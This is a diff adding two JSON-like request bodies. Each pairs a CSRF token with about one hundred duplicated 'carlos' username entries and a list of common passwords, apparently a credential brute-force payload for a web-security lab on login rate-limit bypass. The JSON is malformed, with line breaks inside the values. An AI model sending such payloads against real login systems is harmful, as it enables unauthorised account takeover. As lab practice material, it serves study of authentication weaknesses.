@@ -1,0 +1,201 @@
+{"csrf":"2GPPw2ik3CigMVrYyUGolhb9hcOrn7sD","username":"carlos", "password":"123456","username":"carlos", "password":"password
+","username":"carlos", "password":"12345678
+","username":"carlos", "password":"qwerty
+","username":"carlos", "password":"123456789
+","username":"carlos", "password":"12345
+","username":"carlos", "password":"1234
+","username":"carlos", "password":"111111
+","username":"carlos", "password":"1234567
+","username":"carlos", "password":"dragon
+","username":"carlos", "password":"123123
+","username":"carlos", "password":"baseball
+","username":"carlos", "password":"abc123
+","username":"carlos", "password":"football
+","username":"carlos", "password":"monkey
+","username":"carlos", "password":"letmein
+","username":"carlos", "password":"shadow
+","username":"carlos", "password":"master
+","username":"carlos", "password":"666666
+","username":"carlos", "password":"qwertyuiop
+","username":"carlos", "password":"123321
+","username":"carlos", "password":"mustang
+","username":"carlos", "password":"1234567890
+","username":"carlos", "password":"michael
+","username":"carlos", "password":"654321
+","username":"carlos", "password":"superman
+","username":"carlos", "password":"1qaz2wsx
+","username":"carlos", "password":"7777777
+","username":"carlos", "password":"121212
+","username":"carlos", "password":"000000
+","username":"carlos", "password":"qazwsx
+","username":"carlos", "password":"123qwe
+","username":"carlos", "password":"killer
+","username":"carlos", "password":"trustno1
+","username":"carlos", "password":"jordan
+","username":"carlos", "password":"jennifer
+","username":"carlos", "password":"zxcvbnm
+","username":"carlos", "password":"asdfgh
+","username":"carlos", "password":"hunter
+","username":"carlos", "password":"buster
+","username":"carlos", "password":"soccer
+","username":"carlos", "password":"harley
+","username":"carlos", "password":"batman
+","username":"carlos", "password":"andrew
+","username":"carlos", "password":"tigger
+","username":"carlos", "password":"sunshine
+","username":"carlos", "password":"iloveyou
+","username":"carlos", "password":"2000
+","username":"carlos", "password":"charlie
+","username":"carlos", "password":"robert
+","username":"carlos", "password":"thomas
+","username":"carlos", "password":"hockey
+","username":"carlos", "password":"ranger
+","username":"carlos", "password":"daniel
+","username":"carlos", "password":"starwars
+","username":"carlos", "password":"klaster
+","username":"carlos", "password":"112233
+","username":"carlos", "password":"george
+","username":"carlos", "password":"computer
+","username":"carlos", "password":"michelle
+","username":"carlos", "password":"jessica
+","username":"carlos", "password":"pepper
+","username":"carlos", "password":"1111
+","username":"carlos", "password":"zxcvbn
+","username":"carlos", "password":"555555
+","username":"carlos", "password":"11111111
+","username":"carlos", "password":"131313
+","username":"carlos", "password":"freedom
+","username":"carlos", "password":"777777
+","username":"carlos", "password":"pass
+","username":"carlos", "password":"maggie
+","username":"carlos", "password":"159753
+","username":"carlos", "password":"aaaaaa
+","username":"carlos", "password":"ginger
+","username":"carlos", "password":"princess
+","username":"carlos", "password":"joshua
+","username":"carlos", "password":"cheese
+","username":"carlos", "password":"amanda
+","username":"carlos", "password":"summer
+","username":"carlos", "password":"love
+","username":"carlos", "password":"ashley
+","username":"carlos", "password":"nicole
+","username":"carlos", "password":"chelsea
+","username":"carlos", "password":"biteme
+","username":"carlos", "password":"matthew
+","username":"carlos", "password":"access
+","username":"carlos", "password":"yankees
+","username":"carlos", "password":"987654321
+","username":"carlos", "password":"dallas
+","username":"carlos", "password":"austin
+","username":"carlos", "password":"thunder
+","username":"carlos", "password":"taylor
+","username":"carlos", "password":"matrix
+","username":"carlos", "password":"mobilemail
+","username":"carlos", "password":"mom
+","username":"carlos", "password":"monitor
+","username":"carlos", "password":"monitoring
+","username":"carlos", "password":"montana
+","username":"carlos", "password":"moon
+","username":"carlos", "password":"moscow 
+",}
+{"csrf":"2GPPw2ik3CigMVrYyUGolhb9hcOrn7sD","username":"carlos", "password":"123456
+", "username":"carlos", "password":"password
+", "username":"carlos", "password":"12345678
+", "username":"carlos", "password":"qwerty
+", "username":"carlos", "password":"123456789
+", "username":"carlos", "password":"12345
+", "username":"carlos", "password":"1234
+", "username":"carlos", "password":"111111
+", "username":"carlos", "password":"1234567
+", "username":"carlos", "password":"dragon
+", "username":"carlos", "password":"123123
+", "username":"carlos", "password":"baseball
+", "username":"carlos", "password":"abc123
+", "username":"carlos", "password":"football
+", "username":"carlos", "password":"monkey
+", "username":"carlos", "password":"letmein
+", "username":"carlos", "password":"shadow
+", "username":"carlos", "password":"master
+", "username":"carlos", "password":"666666
+", "username":"carlos", "password":"qwertyuiop
+", "username":"carlos", "password":"123321
+", "username":"carlos", "password":"mustang
+", "username":"carlos", "password":"1234567890
+", "username":"carlos", "password":"michael
+", "username":"carlos", "password":"654321
+", "username":"carlos", "password":"superman
+", "username":"carlos", "password":"1qaz2wsx
+", "username":"carlos", "password":"7777777
+", "username":"carlos", "password":"121212
+", "username":"carlos", "password":"000000
+", "username":"carlos", "password":"qazwsx
+", "username":"carlos", "password":"123qwe
+", "username":"carlos", "password":"killer
+", "username":"carlos", "password":"trustno1
+", "username":"carlos", "password":"jordan
+", "username":"carlos", "password":"jennifer
+", "username":"carlos", "password":"zxcvbnm
+", "username":"carlos", "password":"asdfgh
+", "username":"carlos", "password":"hunter
+", "username":"carlos", "password":"buster
+", "username":"carlos", "password":"soccer
+", "username":"carlos", "password":"harley
+", "username":"carlos", "password":"batman
+", "username":"carlos", "password":"andrew
+", "username":"carlos", "password":"tigger
+", "username":"carlos", "password":"sunshine
+", "username":"carlos", "password":"iloveyou
+", "username":"carlos", "password":"2000
+", "username":"carlos", "password":"charlie
+", "username":"carlos", "password":"robert
+", "username":"carlos", "password":"thomas
+", "username":"carlos", "password":"hockey
+", "username":"carlos", "password":"ranger
+", "username":"carlos", "password":"daniel
+", "username":"carlos", "password":"starwars
+", "username":"carlos", "password":"klaster
+", "username":"carlos", "password":"112233
+", "username":"carlos", "password":"george
+", "username":"carlos", "password":"computer
+", "username":"carlos", "password":"michelle
+", "username":"carlos", "password":"jessica
+", "username":"carlos", "password":"pepper
+", "username":"carlos", "password":"1111
+", "username":"carlos", "password":"zxcvbn
+", "username":"carlos", "password":"555555
+", "username":"carlos", "password":"11111111
+", "username":"carlos", "password":"131313
+", "username":"carlos", "password":"freedom
+", "username":"carlos", "password":"777777
+", "username":"carlos", "password":"pass
+", "username":"carlos", "password":"maggie
+", "username":"carlos", "password":"159753
+", "username":"carlos", "password":"aaaaaa
+", "username":"carlos", "password":"ginger
+", "username":"carlos", "password":"princess
+", "username":"carlos", "password":"joshua
+", "username":"carlos", "password":"cheese
+", "username":"carlos", "password":"amanda
+", "username":"carlos", "password":"summer
+", "username":"carlos", "password":"love
+", "username":"carlos", "password":"ashley
+", "username":"carlos", "password":"nicole
+", "username":"carlos", "password":"chelsea
+", "username":"carlos", "password":"biteme
+", "username":"carlos", "password":"matthew
+", "username":"carlos", "password":"access
+", "username":"carlos", "password":"yankees
+", "username":"carlos", "password":"987654321
+", "username":"carlos", "password":"dallas
+", "username":"carlos", "password":"austin
+", "username":"carlos", "password":"thunder
+", "username":"carlos", "password":"taylor
+", "username":"carlos", "password":"matrix
+", "username":"carlos", "password":"mobilemail
+", "username":"carlos", "password":"mom
+", "username":"carlos", "password":"monitor
+", "username":"carlos", "password":"monitoring
+", "username":"carlos", "password":"montana
+", "username":"carlos", "password":"moon
+", "username":"carlos", "password":"moscow 
+", }
